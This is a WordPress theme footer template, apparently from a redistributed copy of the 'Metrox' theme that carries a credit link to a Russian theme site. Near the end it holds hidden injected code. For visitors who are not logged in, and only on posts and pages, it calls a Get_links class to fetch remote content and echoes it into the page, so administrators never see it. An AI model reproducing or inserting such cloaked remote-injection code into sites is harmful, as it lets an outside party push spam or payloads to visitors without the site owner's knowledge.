		<div class="left-sidebar sidebar-mobile">
			<?php get_sidebar("mobile"); ?>
		</div>

		<div class="clearfix"></div>
		<footer>
			<span class="alignleft">&copy; <?php echo date("Y") ?> <a href="<?php echo home_url(); ?>" title="<?php bloginfo('name'); ?>"><?php bloginfo('name'); ?></a></span><br\>
			<span class="alignright"><?php if (is_home() || is_category() || is_archive() ){ ?><a rel="nofollow" target="_blank" href="https://themeisle.com/themes/metrox/">ThemeIsle</a> - <a href="http://wp-templates.ru/">wp темы</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?> </span>
			
			</footer>
	<?php wp_footer(); ?>
	</body>
</html>